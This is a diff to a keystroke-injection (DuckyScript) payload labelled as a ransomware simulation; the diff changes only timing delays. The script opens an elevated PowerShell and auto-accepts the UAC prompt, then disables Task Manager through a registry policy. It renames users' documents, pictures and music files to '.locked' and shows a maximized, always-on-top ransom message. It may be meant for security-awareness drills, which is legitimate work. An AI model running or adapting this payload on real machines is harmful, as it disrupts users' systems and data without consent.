@@ -3,32 +3,32 @@ REM This script is intended to act as a simulation of a ransomware attack
 REM This script will change file extensions to .locked rather than encrypting the files
 REM This script will also display a simulated encrypted message
 
-DELAY 500
+DELAY 750
 GUI r
-DELAY 100
+DELAY 1000
 STRING powershell -Command "Start-Process powershell -Verb runAs"
 ENTER
-DELAY 500
+DELAY 1000
 ALT y
-DELAY 500
+DELAY 1000
 
 REM Check for admin privileges and proceed with Task Manager disable attempt
 STRING if(-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { exit }
 ENTER
 STRING $regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System'; $regName = 'DisableTaskMgr'; Set-ItemProperty -Path $regPath -Name $regName -Value 1
 ENTER
-DELAY 500
+DELAY 1000
 
 REM Rename files in specified locations
 STRING $locations = @('MyDocuments', 'Desktop', 'Pictures', 'Music'); $errorOccurred = $false; foreach ($loc in $locations) { $path = [Environment]::GetFolderPath($loc); $files = Get-ChildItem -Path $path -File | Where-Object { $_.Extension -match '\.doc$|\.xls$|\.jpg$|\.png$|\.mp3$' }; foreach ($file in $files) { $null = $file | Rename-Item -NewName {$file.Name + '.locked'}; if (-not $?){ $errorOccurred = $true } } }
 IF ($errorOccurred) { exit }
 ENTER
-DELAY 1000
+DELAY 2000
 
 REM Display ransomware message
 STRING Add-Type -AssemblyName PresentationFramework; $Window = New-Object System.Windows.Window; $Window.WindowStartupLocation = 'CenterScreen'; $Window.WindowState = 'Maximized'; $Window.Topmost = $true; $Window.Content = 'Your files have been encrypted. This is a simulation. Please contact your IT support team.'; $Window.ShowDialog()
 ENTER
-DELAY 1000
+DELAY 2000
 
 STRING exit
 ENTER
